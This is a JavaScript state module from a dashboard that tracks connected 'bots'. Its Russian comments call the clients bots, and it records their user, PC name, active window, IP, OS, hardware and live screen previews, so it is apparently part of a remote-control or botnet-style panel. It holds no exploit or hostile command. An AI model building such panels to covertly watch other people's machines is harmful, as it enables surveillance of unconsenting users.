// frontend/dashboard/js/modules/data/clients.js

let clients = {};
const emit = (name, detail = null) => window.dispatchEvent(new CustomEvent(name, { detail }));

export const updateClients = (list) => {
    let hasChanges = false;
    list.forEach(c => {
        if (!clients[c.id]) {
            clients[c.id] = { 
                status: 'offline', 
                lastHB: 0, 
                lastPreview: null,
                ...c 
            };
            hasChanges = true;
        }
    });
    if (hasChanges) emit('clientsUpdated');
};

export const updateClient = (data, isLive = false) => {
    if (!data?.id) return;
    const old = clients[data.id];
    
    // Если бота нет в локальном сторе, и мы не можем его создать — выходим
    if (!old && !isLive) return;

    const newStatus = isLive ? 'online' : (old?.status || 'offline');
    const newHB = isLive ? Date.now() : (old?.lastHB || 0);

    // СОЗДАЕМ ОБЪЕКТ ОБНОВЛЕНИЯ
    // Мы берем старые данные и накладываем новые только если они реально пришли в пакете
    const updatedFields = {};
    
    // Список полей, которые мы обновляем только если они не пустые в пришедшем 'data'
    const fieldsToSync = ['loc', 'user', 'pc_name', 'active_window', 'last_active', 'ip', 'os', 'hw'];

    fieldsToSync.forEach(field => {
        const val = data[field];
        // Игнорируем: undefined, null, пустую строку, "0.0.0.0", и строковые "None"/"null"
        const isInvalid = (
            val === undefined || 
            val === null || 
            val === '' || 
            val === '0.0.0.0' || 
            val === 'None' || 
            val === 'null'
        );

        if (!isInvalid) {
            updatedFields[field] = val;
        }
    });

    clients[data.id] = {
        ...old,           // Сохраняем всё, что было (из БД или прошлых обновлений)
        ...updatedFields, // Накладываем только живые данные от бота
        status: newStatus,
        lastHB: newHB
    };

    // Генерируем событие для перерисовки
    if (!old || old.status !== newStatus) {
        emit('clientsUpdated');
    } else {
        emit('clientUpdated', clients[data.id]);
    }
};

// ВОЗВРАЩЕНО: Необходимые функции для работы connection.js и удаления
export const setClientPreview = (id, url) => {
    if (!clients[id]) return;
    if (clients[id].lastPreview?.startsWith('blob:')) {
        URL.revokeObjectURL(clients[id].lastPreview);
    }
    clients[id].lastPreview = url;
};

export const removeClient = (id) => {
    if (clients[id]) {
        if (clients[id].lastPreview?.startsWith('blob:')) {
            URL.revokeObjectURL(clients[id].lastPreview);
        }
        delete clients[id];
        emit('clientRemoved');
    }
};

export const checkDeadClients = () => {
    const now = Date.now();
    let changed = false;
    Object.values(clients).forEach(c => {
        if (c.status === 'online' && (now - c.lastHB) > 10000) {
            c.status = 'offline';
            changed = true;
        }
    });
    if (changed) emit('clientsUpdated');
};

export const getAllClients = () => {
    return Object.values(clients).sort((a, b) => {
        if (a.status === 'online' && b.status !== 'online') return -1;
        if (a.status !== 'online' && b.status === 'online') return 1;
        return a.id.localeCompare(b.id);
    });
};